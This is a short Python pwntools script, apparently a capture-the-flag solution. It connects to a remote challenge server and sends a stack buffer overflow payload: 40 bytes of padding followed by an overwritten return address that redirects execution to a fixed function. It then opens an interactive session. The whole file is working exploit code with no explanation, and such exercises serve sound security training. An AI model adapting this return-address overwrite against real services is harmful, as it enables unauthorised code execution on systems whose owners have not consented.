from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'

r = remote('ctf.adl.tw', 10000)
# p = process('./helloworld')

payload = b'0' * 40 + p64(0x4011fb)
# p.sendafter(b'!', payload)
r.sendafter(b'!', payload)

# p.interactive()
r.interactive()
